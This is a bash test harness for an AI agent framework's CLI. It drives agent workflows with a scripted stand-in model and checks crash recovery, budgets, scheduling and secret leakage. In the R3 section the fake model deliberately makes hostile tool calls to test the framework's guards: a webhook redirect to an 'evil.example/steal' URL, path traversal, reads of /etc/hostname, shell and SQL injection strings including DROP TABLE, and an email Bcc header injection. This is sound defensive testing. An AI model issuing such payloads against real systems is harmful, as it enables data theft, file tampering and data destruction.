#!/usr/bin/env bash
# Gate G5: real `weave` processes against stand-in services. Writes transcripts to evidence/g5/.
#   scripts/g5/run_g5.sh [R1 R2 R3 R4 R5]     (default: all)
# Needs the classes built (mvn -pl src/loom/ai-agent4j-loom compile); it copies the dependencies to target/lib itself.
set -uo pipefail
cd "$(dirname "$0")/../.."
ROOT=$(pwd)
MODULE=$ROOT/src/loom/ai-agent4j-loom
OUT=$ROOT/.kiro/specs/loom-generic-tools/evidence/g5
WORK=$(mktemp -d)
PORT=${G5_PORT:-8765}
CP="$MODULE/target/classes:$MODULE/target/lib/*"
mkdir -p "$OUT"
ls "$MODULE"/target/lib/h2-*.jar >/dev/null 2>&1 || mvn -B -q -f "$MODULE/pom.xml" dependency:copy-dependencies -DincludeScope=test -DoutputDirectory=target/lib >&2
weave() { java -cp "$CP" io.github.llm4j.loom.cli.WeaveCLI "$@" 2>&1 | grep -v "Picked up\|^INFO\|LoomLoader\|^[A-Z][a-z][a-z] [0-9][0-9], 20"; }
services_pid=
start_services() { python3 "$ROOT/scripts/g5/fake_services.py" --port "$PORT" --log "$1" "${@:2}" > "$WORK/services.out" 2>&1 & services_pid=$!; for _ in $(seq 1 50); do grep -q "fake services" "$WORK/services.out" 2>/dev/null && return; sleep 0.1; done; }
stop_services() { [ -n "$services_pid" ] && kill "$services_pid" 2>/dev/null; wait "$services_pid" 2>/dev/null; services_pid=; }
trap 'stop_services; rm -rf "$WORK"' EXIT

# The sample with its models swapped for the stand-in model server (everything else is the real sample).
prepare_sample() {
  mkdir -p "$1"; cp "$MODULE"/samples/digest/*.loom "$1"/
  sed -i 's#model: "gemini-2.5-flash"#model: "ollama/fake"#' "$1"/*.loom
}
export OLLAMA_BASE_URL="http://127.0.0.1:$PORT" HN_URL="http://127.0.0.1:$PORT" SLACK_WEBHOOK="http://127.0.0.1:$PORT/hook/T000/B000/SECRETSECRET1234" HOME="$WORK/home"
mkdir -p "$HOME"
want() { [ $# -eq 0 ] && return 0; for r in "${REQ[@]}"; do [ "$r" = "$1" ] && return 0; done; return 1; }
REQ=("$@"); [ ${#REQ[@]} -eq 0 ] && REQ=(R1 R2 R3 R4 R5)

if want R1 2>/dev/null || [[ " ${REQ[*]} " == *" R1 "* ]]; then
  echo "== R1: the sample, two days"
  D=$WORK/r1; prepare_sample "$D"; cd "$D"
  start_services "$WORK/r1.log"
  {
    echo "\$ weave run digest.loom --workflow DailyDigest --input topic=\"AI agents\" --journal runs/d1 --trace"
    weave run digest.loom --workflow DailyDigest --input topic="AI agents" --journal runs/d1 --trace
    echo "--- digest/digest.md:"; cat digest/digest.md; echo; echo "--- digest/last.json:"; cat digest/last.json; echo
    echo "--- outbox:"; ls outbox; echo "--- first .eml headers:"; sed -n 1,12p outbox/*.eml | head -14
    curl -s "http://127.0.0.1:$PORT/day/2" > /dev/null
    echo; echo "\$ day 2: weave run ... --journal runs/d2 --trace"
    weave run digest.loom --workflow DailyDigest --input topic="AI agents" --journal runs/d2 --trace
    echo "--- digest/digest.md:"; cat digest/digest.md; echo; echo "--- digest/last.json:"; cat digest/last.json; echo
    echo "--- outbox:"; ls outbox
    echo "--- model requests / news requests seen by the stand-in:"; python3 - "$WORK/r1.log" <<'PY'
import json, sys
rows = [json.loads(l) for l in open(sys.argv[1])]
print("chat requests:", sum(1 for r in rows if r["path"].endswith("/chat") or "agent" in r["body"]), " news requests:", sum(1 for r in rows if r["path"].startswith("/v0/")))
PY
  } > "$OUT/R1-sample.txt" 2>&1
  stop_services; cd "$ROOT"
fi

if [[ " ${REQ[*]} " == *" R2 "* ]]; then
  echo "== R2: kill -9 after Slack was told, then resume"
  D=$WORK/r2; prepare_sample "$D"; cd "$D"
  python3 "$ROOT/scripts/g5/fake_services.py" --port "$PORT" --log "$WORK/r2a.log" --hang Pinger > "$WORK/services.out" 2>&1 & services_pid=$!
  sleep 1.5
  {
    echo "\$ weave run digest-slack.loom --workflow DailyDigestWithSlack ... --journal runs/s1   (the Pinger's model call will hang)"
    java -cp "$CP" io.github.llm4j.loom.cli.WeaveCLI run digest-slack.loom --workflow DailyDigestWithSlack --input topic="AI agents" --journal runs/s1 --trace > "$WORK/r2-first.out" 2>&1 &
    WPID=$!
    for _ in $(seq 1 100); do grep -q '"path": "/hook' "$WORK/r2a.log" && break; sleep 0.2; done
    sleep 1
    BEFORE=$(grep -c '"path": "/hook' "$WORK/r2a.log")
    echo "Slack posts seen before the kill: $BEFORE"
    kill -9 "$WPID" 2>/dev/null; wait "$WPID" 2>/dev/null
    echo "weave killed with SIGKILL (pid $WPID)"
    echo "journal after the kill:"; ls runs/s1; python3 -c "
import json,glob
for f in glob.glob('runs/s1/*.json'):
    d=json.load(open(f)); print(f, {k:(v.get('kind') if isinstance(v,dict) else v) for k,v in d.items() if 'effect' in k or k.startswith('Daily')})"
    stop_services
    python3 "$ROOT/scripts/g5/fake_services.py" --port "$PORT" --log "$WORK/r2b.log" > "$WORK/services.out" 2>&1 & services_pid=$!
    sleep 1.5
    echo; echo "\$ the same command again (resume), model no longer hangs"
    weave run digest-slack.loom --workflow DailyDigestWithSlack --input topic="AI agents" --journal runs/s1 --trace
    AFTER=$(grep -c '"path": "/hook' "$WORK/r2b.log")
    echo "--- Slack posts: $BEFORE before the kill + $AFTER after the resume = $((BEFORE + AFTER)) in total (a duplicate would make this 2)"
    echo "--- outbox files: $(ls outbox | wc -l)"
  } > "$OUT/R2-crash-resume.txt" 2>&1
  cp "$WORK/r2-first.out" "$OUT/R2-first-run.txt" 2>/dev/null
  stop_services; cd "$ROOT"
fi


# One tiny workflow per tool, driven by a stand-in model that makes good and hostile calls in a fixed order.
r3_case() {  # name, loom source, replies json
  local name=$1 dir=$WORK/r3-$1
  mkdir -p "$dir/notes"; cd "$dir"
  printf '%s\n' "$2" > "$name.loom"; printf '%s\n' "$3" > replies.json
  echo "alpha" > notes/keep.md; echo "canary" > canary.txt
  : > "$WORK/$name.log"
  python3 "$ROOT/scripts/g5/fake_services.py" --port "$PORT" --log "$WORK/$name.log" --replies replies.json > "$WORK/services.out" 2>&1 & services_pid=$!
  sleep 1.2
  {
    echo "\$ weave run $name.loom --workflow Main --trace"
    HOOK="http://127.0.0.1:$PORT/hook/T000/B000/SECRETSECRET1234" weave run "$name.loom" --workflow Main --trace
    echo "--- requests the stand-in server saw (paths):"; python3 -c "
import json
for l in open('$WORK/$name.log'):
    r=json.loads(l)
    if not r['path'].endswith('/chat'): print('  ', r['method'], r['path'], r['body'][:80])"
    echo "--- files:"; find . -type f ! -name '*.loom' ! -name replies.json | sort | head -20
    echo "--- secret sweep (SECRETSECRET) over this directory's output files:"; grep -rl SECRETSECRET . 2>/dev/null | grep -v '\.loom$' || echo "   none"
  } > "$OUT/R3-$name.txt" 2>&1
  stop_services; cd "$ROOT"
}

if [[ " ${REQ[*]} " == *" R3 "* ]]; then
  echo "== R3: each tool by hand"
  r3_case webhook 'tool Hook { use: webhook  url: env.HOOK  format: json  allow_http: true }
agent Hooker { model: "ollama/fake" system: "You are Hooker." tools: [Hook] max_iterations: 20 }
workflow Main() { delegate "go" to Hooker -> r }' \
'{"Hooker": [{"tool":"Hook","args":{"text":"a fine message"}}, {"tool":"Hook","args":{"text":"x","title":"first line\nsecond line"}}, {"tool":"Hook","args":{"text":""}}, {"tool":"Hook","args":{"text":"redirect attempt","url":"http://evil.example/steal"}}]}'

  r3_case http 'tool Hn { use: http  base_url: env.HN_URL  allow_paths: "/v0/item/*.json" }
agent Reader { model: "ollama/fake" system: "You are Reader." tools: [Hn] max_iterations: 20 }
workflow Main() { delegate "go" to Reader -> r }' \
'{"Reader": [{"tool":"Hn","args":{"path":"/v0/item/101.json"}}, {"tool":"Hn","args":{"path":"/v0/item/101.json\t"}}, {"tool":"Hn","args":{"path":"/v0/item/..%2f..%2fetc"}}, {"tool":"Hn","args":{"path":"/v0/item/1.json?admin=1"}}, {"tool":"Hn","args":{"path":"//v0/item/1.json"}}, {"tool":"Hn","args":{"path":"/v0/item/1.json","method":"DELETE"}}, {"tool":"Hn","args":{"path":"/v0/topstories.json"}}]}'

  r3_case file 'tool Notes { use: file  root: "notes"  mode: readwrite }
agent Clerk { model: "ollama/fake" system: "You are Clerk." tools: [Notes] max_iterations: 20 }
workflow Main() { delegate "go" to Clerk -> r }' \
'{"Clerk": [{"tool":"Notes","args":{"action":"write","path":"made.md","content":"hello"}}, {"tool":"Notes","args":{"action":"write","path":"../canary.txt","content":"PWNED"}}, {"tool":"Notes","args":{"action":"read","path":"/etc/hostname"}}, {"tool":"Notes","args":{"action":"write","path":".hidden.md","content":"x"}}, {"tool":"Notes","args":{"action":"write","path":"sub/../../canary.md","content":"x"}}, {"tool":"Notes","args":{"action":"append","path":"keep.md","content":"more"}}]}'

  r3_case shell 'tool Ops { use: shell  allow: "echo"  unattended: true }
agent Runner { model: "ollama/fake" system: "You are Runner." tools: [Ops] max_iterations: 20 }
workflow Main() { delegate "go" to Runner -> r }' \
'{"Runner": [{"tool":"Ops","args":{"program":"echo","args":["hello","$(date)","; touch pwned"]}}, {"tool":"Ops","args":{"program":"ls","args":["-la"]}}, {"tool":"Ops","args":{"program":"echo$IFS","args":["x"]}}, {"tool":"Ops","args":{"program":"/usr/bin/echo","args":["x"]}}, {"tool":"Ops","args":{"program":"echo","args":["line1\nline2"]}}]}'

  r3_case email 'tool Mail { use: email  outbox: "outbox"  from: "a@example.com"  allow_to: "*@example.com" }
agent Mailer { model: "ollama/fake" system: "You are Mailer." tools: [Mail] max_iterations: 20 }
workflow Main() { delegate "go" to Mailer -> r }' \
'{"Mailer": [{"tool":"Mail","args":{"to":"team@example.com","subject":"hello","body":"fine"}}, {"tool":"Mail","args":{"to":"x@evil.example","subject":"s","body":"b"}}, {"tool":"Mail","args":{"to":"team@example.com","subject":"s\nBcc: evil@evil.example","body":"b"}}, {"tool":"Mail","args":{"to":"a@example.com, b@sub.example.com","subject":"s","body":"b"}}]}'

  # sql needs a database file the weave process can open
  SQLDIR=$WORK/r3-sql; mkdir -p "$SQLDIR"
  H2=$(ls "$MODULE"/target/lib/h2-*.jar | head -1)
  echo "CREATE TABLE people(id INT, name VARCHAR(50)); INSERT INTO people VALUES (1,'Asha'),(2,'Ben');" > "$SQLDIR/init.sql"
  java -cp "$H2" org.h2.tools.RunScript -url "jdbc:h2:file:$SQLDIR/g5db" -user sa -script "$SQLDIR/init.sql" 2>&1 | grep -v "Picked up"
  DB_URL="jdbc:h2:file:$SQLDIR/g5db" DB_USER=sa DB_PASSWORD="" r3_case sql 'tool Db { use: sql  url: env.DB_URL  user: env.DB_USER }
agent Analyst { model: "ollama/fake" system: "You are Analyst." tools: [Db] max_iterations: 20 }
workflow Main() { delegate "go" to Analyst -> r }' \
'{"Analyst": [{"tool":"Db","args":{"sql":"SELECT name FROM people ORDER BY id"}}, {"tool":"Db","args":{"sql":"SELECT 1; DROP TABLE people"}}, {"tool":"Db","args":{"sql":"DELETE FROM people WHERE id = 1"}}, {"tool":"Db","args":{"sql":"SELECT * FROM people INTO OUTFILE '"'"'x'"'"'"}}, {"tool":"Db","args":{"sql":"SELECT name FROM people WHERE name = ?","params":["x'"'"' OR '"'"'1'"'"'='"'"'1"]}}, {"tool":"Db","args":{"sql":"SELECT FILE_READ('"'"'/etc/hostname'"'"')"}}]}'
  echo "--- rows in the table after the sql run:" >> "$OUT/R3-sql.txt"
  java -cp "$H2" org.h2.tools.Shell -url "jdbc:h2:file:$SQLDIR/g5db" -user sa -sql "SELECT COUNT(*) FROM people" 2>&1 | grep -v "Picked up" >> "$OUT/R3-sql.txt"
fi

# R4: scheduling and installing (the plan only: this container has no crontab or systemd to change)
if [[ " ${REQ[*]} " == *" R4 "* ]]; then
  echo "== R4: schedule sync and the install plan"
  D=$WORK/r4; prepare_sample "$D"; cd "$D"
  {
    echo "\$ weave schedule sync digest.loom --store store"; weave schedule sync digest.loom --store store
    echo "\$ weave triggers list store"; weave triggers list store
    printf 'GEMINI_API_KEY=k\n' > env
    echo "\$ weave triggers install store --backend systemd --env-file env     (no --apply: a plan, nothing written)"; weave triggers install store --backend systemd --env-file env | cut -c1-160
    echo "--- anything written under HOME?"; find "$HOME" -type f 2>/dev/null | head -3; echo "(end of listing)"
    echo "\$ weave triggers install store --backend cloud-scheduler --url https://digest.example.com --service-account tick@p.iam.gserviceaccount.com"
    weave triggers install store --backend cloud-scheduler --url https://digest.example.com --service-account tick@p.iam.gserviceaccount.com | cut -c1-200
  } > "$OUT/R4-schedule.txt" 2>&1
  cd "$ROOT"
fi

# R5: a budget that can't pay for a single call
if [[ " ${REQ[*]} " == *" R5 "* ]]; then
  echo "== R5: --max-tokens 1"
  D=$WORK/r5; prepare_sample "$D"; cd "$D"
  start_services "$WORK/r5.log"
  {
    echo "\$ weave run digest.loom --workflow DailyDigest --input topic=x --max-tokens 1"
    weave run digest.loom --workflow DailyDigest --input topic=x --max-tokens 1
    echo "exit status above is the last line of weave's output; model requests that reached the stand-in server:"
    python3 -c "
import json
rows=[json.loads(l) for l in open('$WORK/r5.log')]
print('  chat requests:', sum(1 for r in rows if r['path'].endswith('/chat')), ' news requests:', sum(1 for r in rows if r['path'].startswith('/v0/')))"
    echo "files created:"; find . -type f ! -name '*.loom' | sort | head
  } > "$OUT/R5-budget.txt" 2>&1
  stop_services; cd "$ROOT"
fi

# R6: a secrets sweep. Every secret option holds SECRETSECRET..., and the calls are chosen to provoke errors and echoes.
if [[ " ${REQ[*]} " == *" R6 "* ]]; then
  echo "== R6: secrets sweep"
  D=$WORK/r6; mkdir -p "$D/notes" "$D/db"; cd "$D"
  H2=$(ls "$MODULE"/target/lib/h2-*.jar | head -1)
  echo "CREATE TABLE t(id INT);" > init.sql
  java -cp "$H2" org.h2.tools.RunScript -url "jdbc:h2:file:$D/db/real" -user sa -password realpass -script init.sql 2>&1 | grep -v "Picked up"
  cat > sweep.loom <<'LOOM'
tool Hook { use: webhook  url: env.HOOK  allow_http: true  retries: 0 }
tool Api  { use: http  base_url: env.HN_URL  auth_header: "Authorization"  auth_value: env.API_TOKEN  "header.X-Api-Key": env.API_KEY }
tool Mail { use: email  host: "127.0.0.1"  port: 1  security: none  username: env.SMTP_USER  password: env.SMTP_PASSWORD  from: "a@example.com"  to: "b@example.com" }
tool Db   { use: sql  url: env.DB_URL  user: "sa"  password: env.DB_PASSWORD }
tool Ops  { use: shell  allow: "printenv"  env_pass: "SECRETSECRET_SHELLVAR"  unattended: true }
agent Prober { model: "ollama/fake" system: "You are Prober." tools: [Hook, Api, Mail, Db, Ops] max_iterations: 20 }
workflow Main() { delegate "probe" to Prober -> r }
LOOM
  cat > replies.json <<'JSON'
{"Prober": [{"tool":"Hook","args":{"text":"hello"}}, {"tool":"Api","args":{"path":"/echo"}}, {"tool":"Mail","args":{"subject":"s","body":"b"}},
            {"tool":"Db","args":{"sql":"SELECT 1"}}, {"tool":"Ops","args":{"program":"printenv","args":["SECRETSECRET_SHELLVAR"]}}]}
JSON
  start_services "$WORK/r6.log" --replies replies.json
  {
    echo "\$ weave run sweep.loom --workflow Main --journal runs/sweep --trace   (every secret option set to a recognisable value)"
    HOOK="http://127.0.0.1:$PORT/hook/error/T000/B000/SECRETSECRETwebhook" API_TOKEN="Bearer SECRETSECRETtoken" API_KEY="SECRETSECRETapikey" \
    SMTP_USER="SECRETSECRETuser" SMTP_PASSWORD="SECRETSECRETsmtp" DB_URL="jdbc:h2:file:$D/db/real;IFEXISTS=TRUE" DB_PASSWORD="SECRETSECRETdb" \
    SECRETSECRET_SHELLVAR="SECRETSECRETshellvalue" weave run sweep.loom --workflow Main --journal runs/sweep --trace
  } > "$D/weave-output.txt" 2>&1
  cp "$D/weave-output.txt" "$OUT/R6-sweep-run.txt"
  {
    echo "--- what each probe came back as (from the trace):"; grep -E "Prober  .. (Error|HTTP|exit|Sent|Wrote)" "$D/weave-output.txt" | cut -c1-230
    echo "--- journal and every file the run left:"; find . -type f ! -name init.sql ! -name sweep.loom ! -name replies.json | sort | head -20
    VALUES='SECRETSECRET(webhook|token|apikey|user|smtp|db|shellvalue)'
    echo "--- grep -rE '$VALUES' over the working directory (journal, outbox, notes, db files, weave's own stdout and stderr):"
    grep -rlE "$VALUES" . 2>/dev/null | grep -v "^./sweep.loom\|^./replies.json" || echo "   NO FILE CONTAINS A SECRET VALUE"
    echo "--- (the variable NAME SECRETSECRET_SHELLVAR appears in the trace because the stand-in model passed it to printenv; that is a name, not a value)"
    echo "--- values the stand-in server received (a real server would also receive them): $(grep -cE "$VALUES" "$WORK/r6.log") request(s)"
  } > "$OUT/R6-sweep.txt" 2>&1
  stop_services; cd "$ROOT"
fi

echo "transcripts in $OUT"
